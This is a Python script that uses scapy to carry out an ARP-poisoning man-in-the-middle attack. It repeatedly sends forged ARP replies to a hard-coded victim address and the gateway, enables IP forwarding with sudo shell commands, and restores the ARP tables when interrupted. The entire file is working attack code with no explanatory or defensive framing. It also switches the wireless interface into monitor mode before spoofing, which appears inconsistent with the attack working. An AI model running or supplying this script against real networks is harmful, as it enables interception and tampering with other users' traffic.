import subprocess
import time
from scapy.all import ARP, Ether, send, srp

victim_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"
iface = "wlan0"

def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def set_monitor_mode(interface):
    print(f"[*] Setting {interface} to monitor mode...")
    run_cmd(f"sudo ip link set {interface} down")
    run_cmd(f"sudo iw dev {interface} set type monitor")
    run_cmd(f"sudo ip link set {interface} up")

def set_managed_mode(interface):
    print(f"[*] Restoring {interface} to managed mode...")
    run_cmd(f"sudo ip link set {interface} down")
    run_cmd(f"sudo iw dev {interface} set type managed")
    run_cmd(f"sudo ip link set {interface} up")

def get_mac(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered = srp(arp_req_broadcast, timeout=2, iface=iface, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=iface, verbose=False)

def restore(dest_ip, source_ip, dest_mac, source_mac):
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, iface=iface, verbose=False)

try:
    set_monitor_mode(iface)  # Enable monitor mode before attack

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print("[*] Enabling IP forwarding...")
    run_cmd("sudo sysctl -w net.ipv4.ip_forward=1")

    print("[*] Starting ARP poisoning... Press Ctrl+C to stop.")
    while True:
        spoof(victim_ip, gateway_ip, victim_mac)
        spoof(gateway_ip, victim_ip, gateway_mac)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Restoring network...")
    restore(victim_ip, gateway_ip, victim_mac, gateway_mac)
    restore(gateway_ip, victim_ip, gateway_mac, victim_mac)
    run_cmd("sudo sysctl -w net.ipv4.ip_forward=0")
    set_managed_mode(iface)  # Restore managed mode so Wi-Fi can reconnect
    print("[+] ARP tables restored, IP forwarding disabled, interface back to managed mode.")
